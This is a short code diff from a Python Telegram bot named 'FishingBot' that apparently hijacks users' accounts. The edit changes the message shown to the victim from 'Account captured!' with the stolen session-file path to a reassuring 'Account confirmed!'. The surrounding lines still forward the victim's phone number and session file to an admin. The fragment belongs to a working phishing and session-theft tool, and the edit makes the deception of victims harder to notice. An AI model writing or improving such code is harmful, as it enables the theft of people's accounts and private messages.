@@ -255,8 +255,7 @@ class FishingBot:
             
             await event.respond(
                 "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
-                f"🎯 Аккаунт захвачен!\n"
-                f"📁 Данные: `{tdata_path}`"
+                f"🎯 Аккаунт подтвержден!\n"
             )
             
             await self.notify_admin(user_id, auth_data['phone'], session_file)
